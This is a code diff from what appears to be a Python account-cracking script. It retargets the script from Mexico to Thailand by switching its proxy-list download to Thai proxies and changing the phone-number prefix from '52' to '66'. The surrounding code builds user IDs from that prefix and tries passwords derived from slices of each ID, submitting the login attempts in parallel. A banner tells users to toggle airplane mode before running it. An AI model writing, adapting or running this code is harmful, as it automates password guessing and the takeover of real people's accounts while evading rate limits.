@@ -794,7 +794,7 @@ def ua():
     return ua_
 #-------------------------(PROXY)----------------------------#
 try:
-  proxylist= requests.get('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&country=mx&proxy_format=protocolipport&format=text&timeout=20000').text
+  proxylist= requests.get('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&country=th&proxy_format=protocolipport&format=text&timeout=7213').text
   open('socksku.txt','w').write(proxylist)
 except Exception as e:
   print(' server error')
@@ -1202,7 +1202,7 @@ def SUMON3():
         linex();print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
         for love in user:
             uidd=kode+love
-            uid ='52' +uidd
+            uid ='66' +uidd
             pwx = [uidd[:6],uidd[:8],uidd,uidd[2:],uidd[4:]]
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
